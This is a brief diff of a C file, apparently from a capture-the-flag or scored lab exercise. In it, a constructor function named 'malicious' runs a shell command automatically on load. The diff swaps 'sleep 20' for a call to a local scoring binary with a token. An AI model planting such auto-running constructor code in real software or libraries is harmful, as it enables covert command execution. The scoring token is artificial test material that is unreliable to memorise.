@@ -1,12 +1,8 @@
 #include<stdio.h>
 #include<stdlib.h>
 
-
-static void main() __attribute__((constructor));
+static void malicious() __attribute__((constructor));
 
 void malicious() {
-
-system("sleep 20");
-
+    system("/usr/local/bin/score d84e4cfa-fca8-407c-b3d8-898bedad184d");
 }
-
